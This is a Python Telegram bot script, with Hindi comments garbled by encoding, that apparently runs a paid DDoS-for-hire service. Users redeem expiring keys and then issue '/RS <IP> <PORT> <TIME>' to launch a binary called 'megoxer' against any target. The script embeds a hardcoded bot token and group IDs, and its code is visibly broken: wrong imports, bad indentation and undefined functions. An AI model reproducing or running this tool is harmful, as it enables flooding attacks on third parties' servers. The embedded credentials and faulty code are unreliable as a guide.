#!/usr/bin/python3
import telebot
import datetime
import subprocess
import threading
import random
import string
import pytz
import json
import os
import InlineKeyboardMarkup
import InlineKeyboardButton

# ‚úÖ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7053228704:AAGRC0PMM4n3zLuUFWsNTw3oitSdYOTf5dg')

# ‚úÖ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002252633433"
ADMINS = ["7129010361"]

SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"

# ‚úÖ FILE PATHS
USER_FILE = "users.txt"
KEY_FILE = "keys.txt"
REDEEM_LOG_FILE = "redeem_log.json"

# ‚úÖ Timezone ‡§∏‡•á‡§ü (IST)
IST = pytz.timezone('Asia/Kolkata')

def validate_key(key, user_id):
    now = datetime.datetime.now(IST)
    
    if key in keys:
        if now < keys[key]:
            return True
        else:
            # ‚úÖ Key Expired: Remove User from allowed_users
            if user_id in allowed_users:
                allowed_users.remove(user_id)
                with open(USER_FILE, "w") as file:
                    file.writelines("\n".join(allowed_users))
            
            # ‚úÖ Expired Key ‡§ï‡•ã Delete ‡§ï‡§∞‡•ã  
            del keys[key]
            write_keys(keys)

            # ‚úÖ Redeem Log ‡§∏‡•á ‡§≠‡•Ä ‡§Ø‡•Ç‡§ú‡§∞ ‡§π‡§ü‡§æ‡§ì  
            if user_id in redeem_log:
                del redeem_log[user_id]
                save_redeem_log(redeem_log)

    return False   

def remove_expired_users():
    now = datetime.datetime.now(IST)
    expired_users = []

    # ‚úÖ Check ‡§ï‡§∞‡•ã ‡§ï‡§ø ‡§ï‡•å‡§®-‡§ï‡•å‡§® ‡§∏‡•á ‡§Ø‡•Ç‡§ú‡§º‡§∞‡•ç‡§∏ ‡§ï‡•Ä Key Expire ‡§π‡•ã ‡§ö‡•Å‡§ï‡•Ä ‡§π‡•à
    for user_id, key in redeem_log.items():
        if key in keys and now > keys[key]:  # ‡§Ö‡§ó‡§∞ Key Expired ‡§π‡•ã ‡§ó‡§à ‡§π‡•à
            expired_users.append(user_id)

    # ‚úÖ Expired Users ‡§ï‡•ã allowed_users ‡§∏‡•á Remove ‡§ï‡§∞‡•ã
    for user_id in expired_users:
        if user_id in allowed_users:
            allowed_users.remove(user_id)

        # ‚úÖ Redeem Log ‡§∏‡•á ‡§Ø‡•Ç‡§ú‡§º‡§∞ ‡§π‡§ü‡§æ‡§ì
        del redeem_log[user_id]

    # ‚úÖ Expired Keys ‡§ï‡•ã Delete ‡§ï‡§∞‡•ã
    for key in list(keys.keys()):
        if now > keys[key]:
            del keys[key]

    # ‚úÖ Updated Data ‡§ï‡•ã Save ‡§ï‡§∞‡•ã
    save_redeem_log(redeem_log)
    write_keys(keys)

    with open(USER_FILE, "w") as file:
        file.writelines("\n".join(allowed_users))

# ‚úÖ ‡§ú‡§¨ ‡§¨‡•â‡§ü ‡§∏‡•ç‡§ü‡§æ‡§∞‡•ç‡§ü ‡§π‡•ã, ‡§§‡§¨ Expired Users Remove ‡§π‡•ã ‡§ú‡§æ‡§è‡§Ç
remove_expired_users()


# ‚úÖ Redeem Log ‡§≤‡•ã‡§°/‡§∏‡•á‡§µ ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
def load_redeem_log():
    try:
        with open(REDEEM_LOG_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_redeem_log(log):
    with open(REDEEM_LOG_FILE, "w") as file:
        json.dump(log, file)

redeem_log = load_redeem_log()

# ‚úÖ Key ‡§î‡§∞ User ‡§°‡•á‡§ü‡§æ ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        expiry = IST.localize(expiry)  # ‚úÖ Fix: ‡§ü‡§æ‡§á‡§Æ‡§ú‡§º‡•ã‡§® ‡§ú‡•ã‡§°‡§º ‡§¶‡§ø‡§Ø‡§æ
                        keys[key] = expiry
                    except ValueError:
                        print(f"‚ö† Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def read_users():
    users = set()
    try:
        with open(USER_FILE, "r") as file:
            users = set(file.read().splitlines())
    except FileNotFoundError:
        pass
    return users

allowed_users = read_users()
keys = read_keys()

# ‚úÖ Key Generate, Validate, Remove
def generate_key(days=0, hours=0):
    new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)  # ‚úÖ Fix: expiry ‡§Ö‡§¨ ‡§∏‡§π‡•Ä ‡§∏‡•á ‡§¨‡§® ‡§∞‡§π‡§æ ‡§π‡•à
    keys[new_key] = expiry
    write_keys(keys)
    return new_key

# ‚úÖ /START Command (Welcome + Help Button)
@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    first_name = user.first_name if user.first_name else "User"

    # ‚úÖ Inline Button for Help
    markup = InlineKeyboardMarkup()
    help_button = InlineKeyboardButton("‚Ñπ HELP", callback_data="show_help")
    markup.add(help_button)

    welcome_text = f"üëã **WELCOME, {first_name}!**\n‡§Æ‡•à‡§Ç ‡§§‡•Å‡§Æ‡•ç‡§π‡§æ‡§∞‡•Ä ‡§π‡•á‡§≤‡•ç‡§™ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π‡§æ‡§Å ‡§π‡•Ç‡§Å‡•§ ‡§®‡•Ä‡§ö‡•á ‡§¶‡§ø‡§è ‡§ó‡§è ‡§¨‡§ü‡§® ‡§™‡§∞ ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•ã:"

    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")


# ‚úÖ CALLBACK HANDLER FOR HELP BUTTON
@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def help_callback(call):
    help_text = """
üìå **BOT COMMANDS LIST:**  

üë§ **USER COMMANDS:**  
üîπ `/myinfo` - ‡§Ö‡§™‡§®‡§æ ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏ ‡§î‡§∞ Key ‡§ï‡•Ä Expiry ‡§ö‡•á‡§ï ‡§ï‡§∞‡•ã  
üîπ `/redeem <KEY>` - ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§™‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è Key ‡§∞‡§ø‡§°‡•Ä‡§Æ ‡§ï‡§∞‡•ã  
üîπ `/RS <IP> <PORT> <TIME>` - ‡§Ö‡§ü‡•à‡§ï ‡§∏‡•ç‡§ü‡§æ‡§∞‡•ç‡§ü ‡§ï‡§∞‡•ã  

üëë **ADMIN COMMANDS:**  
üîπ `/genkey <DAYS> [HOURS]` - ‡§®‡§à Key ‡§¨‡§®‡§æ‡§ì  
üîπ `/removekey <KEY>` - ‡§ï‡§ø‡§∏‡•Ä Key ‡§ï‡•ã ‡§°‡§ø‡§≤‡•Ä‡§ü ‡§ï‡§∞‡•ã  
üîπ `/stats` - ‡§è‡§ï‡•ç‡§ü‡§ø‡§µ ‡§Ö‡§ü‡•à‡§ï‡•ç‡§∏ ‡§ï‡•ã ‡§¶‡•á‡§ñ‡•ã  
üîπ `/check` - ‡§∏‡§≠‡•Ä ‡§è‡§ï‡•ç‡§ü‡§ø‡§µ Keys ‡§ï‡•ã ‡§¶‡•á‡§ñ‡•ã  
"""

    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")

# ‚úÖ /GENKEY Command (Admin Only)
# ‚úÖ /GENKEY Command (Admin Only) - Now Generates Keys in "1H-RSVIP-XXXXXX" Format
@bot.message_handler(commands=['genkey'])
def generate_new_key(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "‚ùå ADMIN ONLY COMMAND!")
        return

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(message, "‚ö† USAGE: /genkey <DAYS> [HOURS]")
        return

    try:
        days = int(command[1])
        hours = int(command[2]) if len(command) > 2 else 0  # ‚úÖ ‡§Ö‡§¨ ‡§ò‡§Ç‡§ü‡•á ‡§≠‡•Ä ‡§ê‡§° ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
    except ValueError:
        bot.reply_to(message, "‚ùå DAYS AND HOURS MUST BE NUMBERS!")
        return

    # ‚úÖ ‡§Ö‡§¨ ‡§ï‡•Ä ‡§ï‡§æ ‡§´‡•â‡§∞‡•ç‡§Æ‡•á‡§ü ‡§∏‡§π‡•Ä ‡§¨‡§®‡§æ‡§§‡•á ‡§π‡•à‡§Ç
    if days > 0 and hours == 0:
        prefix = f"{days}D-RSVIP"
    elif hours > 0 and days == 0:
        prefix = f"{hours}H-RSVIP"
    else:
        prefix = f"{days}D{hours}H-RSVIP"

    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  # ‚úÖ 6 Random Characters
    new_key = f"{prefix}-{random_part}"

    expiry = datetime.datetime.now(IST) + datetime.timedelta(days=days, hours=hours)
    keys[new_key] = expiry
    write_keys(keys)

    bot.reply_to(message, f"‚úÖ NEW KEY GENERATED:\nüîë `{new_key}`\nüìÖ Expiry: {days} Days, {hours} Hours", parse_mode="Markdown")

# ‚úÖ /REMOVEKEY Command (Admin Only)
@bot.message_handler(commands=['removekey'])
def remove_existing_key(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "‚ùå ADMIN ONLY COMMAND!")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "‚ö† USAGE: /removekey <KEY>")
        return

    if remove_key(command[1]):
        bot.reply_to(message, "‚úÖ KEY REMOVED SUCCESSFULLY!")
    else:
        bot.reply_to(message, "‚ùå KEY NOT FOUND!")

# ‚úÖ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
# ‚úÖ SCREENSHOT VERIFICATION SYSTEM (Detects Fake Screenshots)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id

    # ‚úÖ Get File ID & Caption
    file_id = message.photo[-1].file_id
    caption_text = f"üì∏ **USER SCREENSHOT RECEIVED!**\nüë§ **User ID:** `{user_id}`\n‚úÖ **Forwarded to Admins!`"

    # ‚úÖ Send Screenshot to Verification Channel
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")

    # ‚úÖ AI-Based Fake Screenshot Detection (Basic)
    # **‡§Ø‡•á ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§°‡•á‡§Æ‡•ã ‡§π‡•à, ‡§Ö‡§∏‡§≤‡•Ä AI ‡§á‡§Ç‡§ü‡•á‡§ó‡•ç‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è OCR & Metadata ‡§ö‡•á‡§ï ‡§ê‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•ã**
    if "old" in message.caption.lower() or "fake" in message.caption.lower():
        bot.reply_to(message, "‚ö† **WARNING:** ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ø‡§π **‡§´‡•á‡§ï ‡§Ø‡§æ ‡§™‡•Å‡§∞‡§æ‡§®‡§æ ‡§∏‡•ç‡§ï‡•ç‡§∞‡•Ä‡§®‡§∂‡•â‡§ü** ‡§π‡•à! üö®")
    else:
        bot.reply_to(message, "‚úÖ SCREENSHOT VERIFIED & FORWARDED!")

    bot.reply_to(message, "üì§ **SCREENSHOT FORWARDED SUCCESSFULLY!**")

    bot.reply_to(message, "‚úÖ SCREENSHOT FORWARDED SUCCESSFULLY!")

# ‚úÖ Active Attacks ‡§ï‡•ã Track ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ Dictionary  
active_attacks = {}

# ‚úÖ /REDEEM Command (User Access)
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "‚ö† USAGE: /redeem <KEY>")
        return

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name  
    key = command[1]

    # ‚úÖ ‡§Ö‡§ó‡§∞ User ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§ï‡•ã‡§à Key Redeem ‡§ï‡§∞ ‡§ö‡•Å‡§ï‡§æ ‡§π‡•à
    if user_id in redeem_log:
        bot.reply_to(message, f"‚ùå YOU HAVE ALREADY REDEEMED A KEY!\nüîë **Your Key:** `{redeem_log[user_id]}`", parse_mode="Markdown")
        return

    # ‚úÖ Check ‡§Ö‡§ó‡§∞ Key Exist ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•Ä  
    if key not in keys:
        bot.reply_to(message, "‚ùå INVALID KEY! üîë")  
        return

    # ‚úÖ ‡§Ö‡§ó‡§∞ Key Expired ‡§π‡•ã ‡§ó‡§à ‡§π‡•à  
    expiry_date = keys[key]
    if datetime.datetime.now(IST) > expiry_date:
        del keys[key]  # ‚úÖ Expired Key ‡§π‡§ü‡§æ‡§ì
        write_keys(keys)
        bot.reply_to(message, f"‚è≥ THIS KEY HAS **EXPIRED!**\nüìÖ **Expired On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
        return

    # ‚úÖ Check ‡§Ö‡§ó‡§∞ Key ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§î‡§∞ ‡§®‡•á Redeem ‡§ï‡§∞ ‡§≤‡•Ä ‡§π‡•à  
    if key in redeem_log.values():
        existing_user = [uid for uid, k in redeem_log.items() if k == key][0]
        bot.reply_to(message, f"‚ùå THIS KEY HAS ALREADY BEEN REDEEMED!\nüë§ **User ID:** `{existing_user}`", parse_mode="Markdown")
        return

    # ‚úÖ Grant Access & Save User  
    allowed_users.add(user_id)
    redeem_log[user_id] = key
    save_redeem_log(redeem_log)

    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")

    bot.reply_to(message, f"üéâ ACCESS GRANTED!\nüë§ **User:** `{user_name}`\nüÜî **User ID:** `{user_id}`\nüîë **Key:** `{key}`\nüìÖ **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")

## ‚úÖ /RS Attack Command (Auto-Remove from /stats)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    if chat_id != GROUP_ID:
        bot.reply_to(message, "‚ùå YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
        return

    if user_id not in allowed_users:
        bot.reply_to(message, "‚ùå YOU NEED TO REDEEM A KEY FIRST!")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "‚ö† USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "‚ùå PORT AND TIME MUST BE NUMBERS!")
        return

    if time_duration > 240:
        bot.reply_to(message, "üö´ MAX ATTACK TIME IS 240 SECONDS!")
        return

    if user_id not in active_attacks:
        active_attacks[user_id] = []

    if len(active_attacks[user_id]) >= 3:
        bot.reply_to(message, "‚ùå MAXIMUM 3 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
        return

    end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id].append((target, port, end_time))

    bot.reply_to(message, f"üî• ATTACK STARTED!\nüéØ TARGET: {target}\nüî¢ PORT: {port}\n‚è≥ DURATION: {time_duration}s")

    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "‚ùå ATTACK TIMEOUT! SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "‚ùå ATTACK FAILED!")

        # ‚úÖ ‡§Ö‡§ü‡•à‡§ï ‡§ñ‡§§‡•ç‡§Æ ‡§π‡•ã‡§§‡•á ‡§π‡•Ä ‡§≤‡§ø‡§∏‡•ç‡§ü ‡§∏‡•á ‡§π‡§ü‡§æ ‡§¶‡•ã
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[0] != target]
        if not active_attacks[user_id]:  # ‡§Ö‡§ó‡§∞ ‡§ï‡•ã‡§à ‡§Ö‡§ü‡•à‡§ï ‡§¨‡§ö‡§æ ‡§®‡§π‡•Ä‡§Ç, ‡§§‡•ã ‡§è‡§Ç‡§ü‡•ç‡§∞‡•Ä ‡§π‡•Ä ‡§π‡§ü‡§æ ‡§¶‡•ã
            del active_attacks[user_id]

    threading.Thread(target=attack_execution).start()

# ‚úÖ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "‚ùå ADMIN ONLY COMMAND!")
        return

    now = datetime.datetime.now(IST)

    # ‚úÖ ‡§ñ‡§§‡•ç‡§Æ ‡§π‡•Å‡§è ‡§Ö‡§ü‡•à‡§ï ‡§π‡§ü‡§æ‡§ì
    for user_id in list(active_attacks.keys()):
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
        if not active_attacks[user_id]:  # ‡§Ö‡§ó‡§∞ ‡§ï‡•ã‡§à ‡§Ö‡§ü‡•à‡§ï ‡§¨‡§ö‡§æ ‡§®‡§π‡•Ä‡§Ç, ‡§§‡•ã ‡§è‡§Ç‡§ü‡•ç‡§∞‡•Ä ‡§π‡•Ä ‡§π‡§ü‡§æ ‡§¶‡•ã
            del active_attacks[user_id]

    if not active_attacks:
        bot.reply_to(message, "üìä No Active Attacks Right Now!")
        return

    stats_message = "üìä **ACTIVE ATTACKS:**\n\n"

    for user_id, attacks in active_attacks.items():
        stats_message += f"üë§ **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += f"üöÄ **Target:** `{target}`\nüéØ **Port:** `{port}`\n‚è≥ **Ends In:** `{int(remaining_time)}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ‚úÖ /CHECK Command (List Active Keys)
@bot.message_handler(commands=['check'])
def check_keys(message):
    if str(message.from_user.id) not in ADMINS:
         bot.reply_to(message, "‚ùå ADMIN ONLY COMMAND!")
        return

    if not keys:
        bot.reply_to(message, "‚ùå NO ACTIVE KEYS!")
        return

    key_list = "üîë **ACTIVE KEYS:**\n"
    for key, expiry in keys.items():
        key_list += f"üîπ `{key}` - üìÖ Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S IST')}\n"

    bot.reply_to(message, key_list, parse_mode="Markdown")

# ‚úÖ /MYINFO Command (Shows User Details + Key Expiry)
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    user_id = str(user.id)
    username = user.username if user.username else "N/A"
    first_name = user.first_name if user.first_name else "N/A"
    last_name = user.last_name if user.last_name else "N/A"
    
    is_admin = "‚úÖ YES" if user_id in ADMINS else "‚ùå NO"
    has_access = "‚úÖ YES" if user_id in allowed_users else "‚ùå NO"

    # ‚úÖ Key Details Check
    if user_id in redeem_log:
        user_key = redeem_log[user_id]
        expiry_date = keys.get(user_key, None)
        if expiry_date:
            expiry_text = expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')
        else:
            expiry_text = "‚ùå EXPIRED"
    else:
        user_key = "‚ùå NO KEY"
        expiry_text = "N/A"

    info_text = f"""
üë§ **User Info:**
üÜî **User ID:** `{user_id}`
üîπ **Username:** `{username}`
üëë **Admin:** {is_admin}
üéü **Access:** {has_access}

üîë **Key Details:**
üîπ **Key:** `{user_key}`
üìÖ **Expiry:** `{expiry_text}`
"""
    bot.reply_to(message, info_text, parse_mode="Markdown")

# ‚úÖ /ANNOUNCE Command (Admin Only)
@bot.message_handler(commands=['announce'])
def announce_message(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "‚ùå ADMIN ONLY COMMAND!")
        return

    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "‚ö† USAGE: /announce <message>")
        return

    announcement = f"üì¢ **ANNOUNCEMENT:**\n{command[1]}"
    
    # ‚úÖ Auto-Pin Announcement
    msg = bot.send_message(GROUP_ID, announcement, parse_mode="Markdown")
    bot.pin_chat_message(GROUP_ID, msg.message_id)

    # ‚úÖ Auto-Delete After 2 Hours (7200 seconds)
    threading.Timer(7200, lambda: bot.delete_message(GROUP_ID, msg.message_id)).start()

    bot.reply_to(message, "‚úÖ ANNOUNCEMENT SENT & PINNED!")

# ‚úÖ BOT START (Load Data and Run)
bot.polling(none_stop=True)